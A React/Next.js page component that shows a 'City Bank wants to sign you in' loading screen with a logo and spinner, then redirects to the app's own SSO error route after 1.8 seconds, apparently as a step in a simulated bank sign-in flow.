"use client";

import Image from "next/image";
import { useRouter } from "next/navigation";
import { useEffect } from "react";
import { fontSwitzer } from "@/lib/styles";

export default function CityBankLoadingPage() {
  const router = useRouter();

  useEffect(() => {
    const timer = setTimeout(() => {
      router.push("/sso/city-bank/error");
    }, 1800);

    return () => clearTimeout(timer);
  }, [router]);

  return (
    <div className="min-h-screen bg-[#cfe1f6] flex justify-center">
      <div className="w-full max-w-[393px] min-h-screen bg-white">
        <div style={{ padding: "20px", paddingTop: "60px" }}>
          <div className="flex justify-center mb-[24px]">
            <div className="relative w-[90px] h-[58px]">
              <Image
                src="/images/city_bank2.0.png"
                alt="City Bank"
                fill
                className="object-contain"
              />
            </div>
          </div>

          <h1
            style={{
              ...fontSwitzer,
              fontSize: "20px",
              fontWeight: 600,
              color: "#111",
              textAlign: "center",
              marginBottom: "8px",
            }}
          >
            City Bank wants to sign you in
          </h1>

          <p
            style={{
              ...fontSwitzer,
              fontSize: "14px",
              color: "#767676",
              textAlign: "center",
              marginBottom: "40px",
            }}
          >
            app.citybank.com
          </p>

          <div className="flex justify-center">
            <div
              style={{
                width: "48px",
                height: "48px",
                border: "5px solid #d9e4f8",
                borderTop: "5px solid #025fc9",
                borderRadius: "999px",
                animation: "spin 1s linear infinite",
              }}
            />
          </div>

          <style jsx>{`
            @keyframes spin {
              from {
                transform: rotate(0deg);
              }
              to {
                transform: rotate(360deg);
              }
            }
          `}</style>
        </div>
      </div>
    </div>
  );
}